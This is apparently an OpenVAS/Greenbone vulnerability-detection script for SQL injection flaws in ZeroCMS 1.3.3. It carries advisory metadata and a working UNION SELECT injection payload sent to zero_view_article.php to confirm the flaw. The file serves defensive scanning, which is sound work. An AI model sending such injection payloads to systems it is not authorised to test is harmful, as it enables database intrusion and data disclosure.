if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805331" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-02-03 10:44:23 +0530 (Tue, 03 Feb 2015)" );
	script_name( "ZeroCMS Multiple SQL Injection Vulnerabilities - Feb 2015" );
	script_tag( name: "summary", value: "The host is installed with ZeroCMS and
  is prone to multiple sql injection vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able execute sql query or not." );
	script_tag( name: "insight", value: "The flaw exists as input passed via

  - 'article_id' parameter used in 'zero_view_article.php' script is
  not properly sanitised before being used.

  - 'user_id' parameter used in 'zero_user_transact.php' script is
  not properly sanitised before being used." );
	script_tag( name: "impact", value: "Successful exploitation will allow
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "ZeroCMS version 1.3.3 and prior." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2015/Feb/4" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/130192/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
zeroPort = http_get_port( default: 80 );
if(!http_can_host_php( port: zeroPort )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/cms", "/zerocms", "/ZeroCMS", http_cgi_dirs( port: zeroPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: zeroPort );
	if(ContainsString( rcvRes, ">zeroCMS<" ) && ContainsString( rcvRes, "Login" )){
		url = dir + "/views/zero_view_article.php?article_id=-1+union%20select%20" + "concat(0x53514c2d496e6a656374696f6e2d54657374)" + "%2C2%2C3%2C4%2C5%2C6%20--%20";
		if(http_vuln_check( port: zeroPort, url: url, check_header: TRUE, pattern: "SQL-Injection-Test<", extra_check: make_list( "Login",
			 ">zeroCMS<" ) )){
			report = http_report_vuln_url( port: zeroPort, url: url );
			security_message( port: zeroPort, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

